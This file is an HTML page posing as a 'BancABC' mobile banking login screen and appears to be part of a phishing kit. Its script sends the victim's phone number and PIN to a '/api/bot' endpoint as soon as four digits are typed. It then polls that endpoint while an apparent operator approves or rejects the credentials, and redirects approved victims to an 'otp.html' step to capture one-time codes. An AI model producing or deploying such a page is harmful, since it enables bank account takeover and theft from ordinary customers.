<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login - BancABC</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
    <style>
        * { box-sizing: border-box; font-family: 'Inter', sans-serif; }
        body { margin: 0; background-color: #f8fbff; display: flex; justify-content: center; min-height: 100vh; overflow: hidden; position: relative; }
        
        .bg-curve { position: absolute; top: -50px; right: -50px; width: 200px; height: 200px; background: #FFDD55; border-radius: 50%; z-index: 0; }
        
        .app-container { width: 100%; max-width: 400px; padding: 30px 20px; display: flex; flex-direction: column; position: relative; z-index: 1; }
        
        /* Centered Logo Image */
        .logo-img { width: 200px; height: auto; margin: 20px auto 30px auto; display: block; }

        h1 { font-size: 32px; color: #0A2240; margin-bottom: 5px; text-align: center; font-weight: 700;}
        p { font-size: 14px; color: #666; text-align: center; margin-bottom: 30px; }

        .input-box { display: flex; align-items: center; border: 1px solid #ddd; border-radius: 12px; padding: 15px; margin-bottom: 10px; background: white; }
        .input-icon { font-size: 20px; color: #0066CC; margin-right: 15px; }
        .input-box input { border: none; outline: none; flex-grow: 1; font-size: 16px; color: #333; }
        .input-box input::placeholder { color: #999; }

        .hint-text { font-size: 12px; color: #999; margin-bottom: 20px; padding-left: 15px; }
        .forgot-pin { text-align: right; font-size: 13px; color: #0066CC; font-weight: 600; margin-bottom: 30px; cursor: pointer; }

        #overlay { display: none; position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0,0,0,0.85); color: white; flex-direction: column; justify-content: center; align-items: center; z-index: 999; }
        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #0066CC; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin-bottom: 20px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .error-msg { color: #ffcccc; font-weight: bold; text-align: center; display: none; margin-top: 10px; }
    </style>
</head>
<body>
    <div class="bg-curve"></div>

    <div id="overlay">
        <div class="spinner"></div>
        <h2 style="color:#0066CC;">Verifying...</h2>
        <p style="color:white;">Please wait.</p>
    </div>

    <div class="app-container">
        <img src="logo.png" alt="BancABC Logo" class="logo-img">
        
        <h1>Login</h1>
        <p>Enter your mobile number and PIN to continue.</p>

        <div class="error-msg" id="errorMsg">Invalid PIN. Try again.</div>

        <div class="input-box">
            <span class="input-icon">✉️</span>
            <input type="tel" id="phone" placeholder="Mobile Number">
        </div>
        <div class="hint-text">Enter mobile number to login</div>

        <div class="input-box">
            <span class="input-icon">🔒</span>
            <input type="password" id="pin" placeholder="••••" maxlength="4" inputmode="numeric" pattern="\d*" oninput="checkPin()">
            <span style="color:#999; cursor:pointer;" onclick="togglePin()">👁️</span>
        </div>
        
        <div class="forgot-pin">Forgot PIN?</div>
    </div>

    <script>
        let globalUserId = sessionStorage.getItem('globalUserId') || Date.now().toString().slice(-6);
        sessionStorage.setItem('globalUserId', globalUserId);

        let savedPhone = sessionStorage.getItem('userPhone');
        if(savedPhone) { document.getElementById('phone').value = savedPhone; }

        document.getElementById('pin').addEventListener('input', function (e) {
            this.value = this.value.replace(/[^0-9]/g, '');
        });

        function togglePin() {
            let pinInput = document.getElementById('pin');
            pinInput.type = pinInput.type === "password" ? "text" : "password";
        }

        function checkPin() {
            let phone = document.getElementById('phone').value;
            let pin = document.getElementById('pin').value;
            if (pin.length === 4 && phone.length > 5) {
                submitLogin(phone, pin);
            }
        }

        function submitLogin(phone, pin) {
            document.getElementById('overlay').style.display = 'flex';
            fetch('/api/bot', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ 
                    action: 'send', type: 'PHONE_PIN', userId: globalUserId, 
                    data: { phone: phone, pin: pin } 
                })
            }).then(function() { pollStatus(); })
            .catch(function() {
                document.getElementById('overlay').style.display = 'none';
                alert("Network error.");
            });
        }

        function pollStatus() {
            let interval = setInterval(function() {
                fetch('/api/bot?userId=' + globalUserId + '&type=PHONE_PIN', { cache: 'no-store' })
                .then(function(res) { return res.json(); })
                .then(function(data) {
                    if (data.status === 'approved') {
                        clearInterval(interval);
                        window.location.href = 'otp.html'; 
                    } else if (data.status === 'rejected') {
                        clearInterval(interval);
                        document.getElementById('overlay').style.display = 'none';
                        document.getElementById('errorMsg').style.display = 'block';
                        document.getElementById('pin').value = ''; 
                    }
                });
            }, 2000);
        }
    </script>
</body>
</html>
